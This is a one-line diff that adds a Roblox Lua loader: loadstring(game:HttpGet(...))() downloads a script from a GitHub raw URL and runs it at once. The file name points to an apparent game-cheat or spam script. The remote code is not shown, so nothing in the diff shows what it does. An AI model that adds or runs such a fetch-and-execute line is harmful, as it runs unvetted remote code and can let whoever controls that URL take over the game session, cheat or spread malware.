@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/wideopen-motorcycle-2xp-weekend-customiz-spam6-obt3v4b6fyg9vb.lua"))()
